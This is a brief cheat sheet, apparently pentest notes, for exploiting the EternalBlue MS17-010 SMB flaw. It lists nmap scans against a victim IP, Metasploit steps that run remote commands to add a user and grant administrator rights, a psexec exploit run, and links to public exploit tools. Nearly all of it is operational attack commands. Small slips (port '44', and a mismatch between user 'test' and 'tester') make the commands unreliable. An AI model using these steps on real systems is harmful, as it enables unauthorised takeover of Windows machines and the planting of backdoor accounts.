## eternal blue (ms17_010)

nmap nse:
- nmap -v --script vuln [victim_ip] -p 445,139
- nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44

## eternal blue commands(via metasploit)
- use auxiliary/admin/smb/ms17_010_command
- set rhosts [victim_ip]
- set rport 445
- **set command net user test test123! /add**
- run
- **set command net localgroup administrators tester /add**
- run
## eternal blue psexec (via metasploit)
- use exploit/windows/smb/ms17_010_psexec
- set rhosts [victim_ip]
- run

### tools
- https://github.com/worawit/MS17-010
- https://github.com/3ndG4me/AutoBlue-MS17-010
- https://github.com/sailay1996/eternal-pulsar
- https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
